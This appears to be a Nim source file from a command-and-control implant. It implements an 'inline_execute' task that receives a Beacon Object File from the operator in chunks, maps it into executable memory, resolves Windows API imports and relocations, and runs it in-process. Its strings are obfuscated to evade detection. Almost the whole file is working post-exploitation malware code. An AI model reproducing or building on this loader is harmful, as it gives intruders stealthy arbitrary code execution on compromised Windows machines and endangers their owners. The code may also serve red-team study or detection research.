import json
import ../utils/strenc

when defined(windows):
  import base64, strutils
  import winim/lean
  import ../utils/[structs, b_functions, ptr_math]
  
  type
    InlineExecuteArgs = object
      uuid: string
      bof_entrypoint: string
      bof_arguments: string
    
    COFFEntry = proc(args: ptr byte, argssize: uint32) {.stdcall.}

  proc hexStringToByteArray(hexString: string): seq[byte] =
    result = @[]
    if hexString.len mod 2 != 0:
      return
    for i in countup(0, hexString.len - 1, 2):
      try:
        result.add(fromHex[uint8](hexString[i..i+1]))
      except ValueError:
        return @[]

  proc read32Le(p: ptr uint8): uint32 =
    let arr = cast[ptr UncheckedArray[uint8]](p)
    return cast[uint32](arr[0]) or (cast[uint32](arr[1]) shl 8) or 
           (cast[uint32](arr[2]) shl 16) or (cast[uint32](arr[3]) shl 24)

  proc write32Le(dst: ptr uint8, x: uint32) =
    let arr = cast[ptr UncheckedArray[uint8]](dst)
    arr[0] = cast[uint8](x)
    arr[1] = cast[uint8](x shr 8)
    arr[2] = cast[uint8](x shr 16)
    arr[3] = cast[uint8](x shr 24)

  proc add32(p: ptr uint8, v: uint32) =
    write32Le(p, read32Le(p) + v)

  proc getExternalFunctionAddress(symbolName: string): uint64 =
    if not symbolName.startsWith(obf("__imp_")):
      return 0
    
    let symbolWithoutPrefix = symbolName[6..^1]
    
    # Check for Beacon API functions
    if symbolName.startsWith(obf("__imp_Beacon")) or symbolName.startsWith(obf("__imp_toWideChar")):
      for i in 0..22:
        if symbolWithoutPrefix == functionAddresses[i].name:
          return functionAddresses[i].address
      return 0
    
    try:
      # Try format: __imp_LibraryName$FunctionName (e.g., __imp_kernel32$GetModuleHandleA)
      let parts = symbolWithoutPrefix.split('$', 1)
      if parts.len == 2:
        var libName = parts[0]
        var funcName = parts[1]
        
        if not libName.toLowerAscii().endsWith(".dll"):
          libName &= ".dll"
        
        if '@' in funcName:
          funcName = funcName.split('@')[0]
        
        let lib = LoadLibraryA(addr(libName[0]))
        if lib != 0:
          return cast[uint64](GetProcAddress(lib, addr(funcName[0])))
        return 0
      
      # Try standard format: __imp_FunctionName (e.g., __imp_GetModuleHandleA)
      # Search in common Windows DLLs
      var funcName = symbolWithoutPrefix
      if '@' in funcName:
        funcName = funcName.split('@')[0]
      
      const commonDLLs = [
        obf("kernel32.dll"), obf("ntdll.dll"), obf("advapi32.dll"), obf("user32.dll"),
        obf("ws2_32.dll"), obf("msvcrt.dll"), obf("ole32.dll"), obf("shell32.dll"),
        obf("crypt32.dll"), obf("bcrypt.dll"), obf("winhttp.dll"), obf("secur32.dll")
      ]
      
      for dllName in commonDLLs:
        var dllNameCopy = dllName
        let lib = GetModuleHandleA(addr dllNameCopy[0])
        if lib != 0:
          let funcAddr = cast[uint64](GetProcAddress(lib, addr(funcName[0])))
          if funcAddr != 0:
            return funcAddr
      
    except:
      discard
    return 0

  proc applyGeneralRelocations(patchAddress: uint64, sectionStartAddress: uint64, 
                                givenType: uint16, symbolOffset: uint32) =
    case givenType
    of IMAGE_REL_AMD64_REL32:
      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4))
    of IMAGE_REL_AMD64_ADDR32NB:
      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress - patchAddress - 4))
    of IMAGE_REL_AMD64_ADDR64:
      cast[ptr uint64](patchAddress)[] += sectionStartAddress
    else:
      discard

  proc getNumberOfExternalFunctions(fileBuffer: seq[byte], textSectionHeader: ptr SectionHeader): uint64 =
    let fileHeader = cast[ptr FileHeader](unsafeAddr fileBuffer[0])
    let symbolTable = cast[ptr SymbolTableEntry](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](fileHeader.PointerToSymbolTable))
    var relocationCursor = cast[ptr RelocationTableEntry](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](textSectionHeader.PointerToRelocations))
    
    result = 0
    for i in 0..<cast[int](textSectionHeader.NumberOfRelocations):
      let symbolCursor = cast[ptr SymbolTableEntry](cast[uint](symbolTable) + cast[uint](relocationCursor.SymbolTableIndex * cast[uint32](sizeof(SymbolTableEntry))))
      if symbolCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolCursor.SectionNumber == 0:
        result += 1
      relocationCursor += 1
    result *= cast[uint64](sizeof(ptr uint64))

  proc runCOFF(functionName: string, fileBuffer: seq[byte], argumentBuffer: seq[byte]): (bool, string) =
    var output = ""
    let fileHeader = cast[ptr FileHeader](unsafeAddr fileBuffer[0])
    var totalSize: uint64 = 0
    
    let sectionHeaderArray = cast[ptr SectionHeader](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](fileHeader.SizeOfOptionalHeader) + cast[uint](sizeof(FileHeader)))
    var sectionCursor = sectionHeaderArray
    var textSection: ptr SectionHeader = nil
    var sections: seq[SectionInfo] = @[]
    
    for i in 0..<cast[int](fileHeader.NumberOfSections):
      if $cast[cstring](addr sectionCursor.Name[0]) == obf(".text"):
        textSection = sectionCursor
      sections.add(SectionInfo(Name: $cast[cstring](addr sectionCursor.Name[0]), SectionOffset: totalSize, SectionHeaderPtr: sectionCursor))
      totalSize += sectionCursor.SizeOfRawData
      sectionCursor += 1
    
    if textSection == nil:
      return (false, obf("[!] .text section not found"))
    
    let allocatedMemory = VirtualAlloc(nil, cast[UINT32](totalSize + getNumberOfExternalFunctions(fileBuffer, textSection)), MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)
    if allocatedMemory == nil:
      return (false, obf("[!] Memory allocation failed"))
    
    sectionCursor = sectionHeaderArray
    var memoryCursor: uint64 = 0
    for i in 0..<cast[int](fileHeader.NumberOfSections):
      copyMem(cast[pointer](cast[uint64](allocatedMemory) + memoryCursor), cast[pointer](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](sectionCursor.PointerToRawData)), sectionCursor.SizeOfRawData)
      memoryCursor += sectionCursor.SizeOfRawData
      sectionCursor += 1
    
    output.add(obf("[+] Sections copied\n"))
    
    let symbolTable = cast[ptr SymbolTableEntry](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](fileHeader.PointerToSymbolTable))
    var externalFuncStore = cast[ptr uint64](totalSize + cast[uint64](allocatedMemory))
    var externalFuncCount = 0
    
    for i in 0..<sections.len:
      var relocCursor = cast[ptr RelocationTableEntry](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](sections[i].SectionHeaderPtr.PointerToRelocations))
      for j in 0..<cast[int](sections[i].SectionHeaderPtr.NumberOfRelocations):
        let symbolCursor = cast[ptr SymbolTableEntry](cast[uint](symbolTable) + cast[uint](relocCursor.SymbolTableIndex * cast[uint32](sizeof(SymbolTableEntry))))
        let isExternal = symbolCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolCursor.SectionNumber == 0
        let patchAddr = cast[uint64](allocatedMemory) + sections[i].SectionOffset + cast[uint64](relocCursor.VirtualAddress - sections[i].SectionHeaderPtr.VirtualAddress)
        
        if isExternal:
          let strTableOffset = cast[int](symbolCursor.First.value[1])
          let symbolName = $cast[cstring](cast[uint](symbolTable) + cast[uint](fileHeader.NumberOfSymbols * cast[uint32](sizeof(SymbolTableEntry))) + cast[uint](strTableOffset))
          let funcAddr = getExternalFunctionAddress(symbolName)
          if funcAddr != 0:
            (externalFuncStore + externalFuncCount)[] = funcAddr
            cast[ptr uint32](patchAddr)[] = cast[uint32](cast[uint64](externalFuncStore + externalFuncCount) - patchAddr - 4)
            externalFuncCount += 1
          else:
            discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
            return (false, obf("[!] Unknown symbol: ") & symbolName)
        else:
          let sectionIndex = cast[int](symbolCursor.SectionNumber - 1)
          if sectionIndex < 0 or sectionIndex >= sections.len:
            discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
            return (false, obf("[!] Invalid section index"))
          var sectionStart = cast[uint64](allocatedMemory) + sections[sectionIndex].SectionOffset
          if symbolCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL:
            for k in 0..<sections.len:
              if sections[k].Name == ".text":
                sectionStart = cast[uint64](allocatedMemory) + sections[k].SectionOffset
                break
          applyGeneralRelocations(patchAddr, sectionStart, relocCursor.Type, symbolCursor.Value)
        relocCursor += 1
    
    output.add(obf("[+] Relocations completed\n"))
    
    var entryAddr: uint64 = 0
    for i in 0..<cast[int](fileHeader.NumberOfSymbols):
      let symbolCursor = cast[ptr SymbolTableEntry](cast[uint](symbolTable) + cast[uint](i * sizeof(SymbolTableEntry)))
      if functionName == $cast[cstring](addr symbolCursor.First.Name[0]):
        entryAddr = cast[uint64](allocatedMemory) + sections[symbolCursor.SectionNumber - 1].SectionOffset + symbolCursor.Value
        break
    
    if entryAddr == 0:
      discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
      return (false, obf("[!] Entrypoint '") & functionName & obf("' not found"))
    
    output.add(obf("[+] Entrypoint found, executing...\n"))
    
    let entryPtr = cast[COFFEntry](entryAddr)
    if argumentBuffer.len == 0:
      entryPtr(nil, 0)
    else:
      entryPtr(unsafeAddr argumentBuffer[0], cast[uint32](argumentBuffer.len))
    
    output.add(obf("[+] BOF execution completed\n"))
    
    let outData = BGOD(nil)
    if outData != nil:
      output.add(obf("\n=== BOF Output ===\n") & $outData & obf("\n==================\n"))
    
    discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
    return (true, output)

const CHUNK_SIZE = 512000

proc inlineExecute*(taskId: string, params: JsonNode): JsonNode =
  when not defined(windows):
    return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("inline_execute is only supported on Windows")}
  else:
    try:
      let args = to(params, InlineExecuteArgs)
      return %*{obf("task_id"): taskId, obf("upload"): {obf("file_id"): args.uuid, obf("chunk_num"): 1, obf("chunk_size"): CHUNK_SIZE, obf("full_path"): ""}}
    except Exception as e:
      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Failed to parse parameters: ") & e.msg}

proc processInlineExecuteChunk*(taskId: string, params: JsonNode, chunkData: string, totalChunks: int, currentChunk: int, fileData: var seq[byte]): JsonNode =
  when defined(windows):
    try:
      let args = to(params, InlineExecuteArgs)
      let decoded = decode(chunkData)
      for b in decoded:
        fileData.add(cast[byte](b))
      
      if currentChunk < totalChunks:
        return %*{obf("task_id"): taskId, obf("upload"): {obf("chunk_size"): CHUNK_SIZE, obf("file_id"): args.uuid, obf("chunk_num"): currentChunk + 1, obf("full_path"): ""}}
      
      var output = obf("Executing Beacon Object File...\n")
      var argumentBuffer: seq[byte] = @[]
      if args.bof_arguments.len > 0:
        argumentBuffer = hexStringToByteArray(args.bof_arguments)
        if argumentBuffer.len == 0 and args.bof_arguments.len > 0:
          return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("[!] Error parsing arguments")}
      
      let (success, bofOutput) = runCOFF(args.bof_entrypoint, fileData, argumentBuffer)
      output.add(bofOutput)
      
      if not success:
        return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): output}
      
      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): obf("success"), obf("user_output"): output}
    except Exception as e:
      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Failed to execute BOF: ") & e.msg}
  else:
    return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("inline_execute is only supported on Windows")}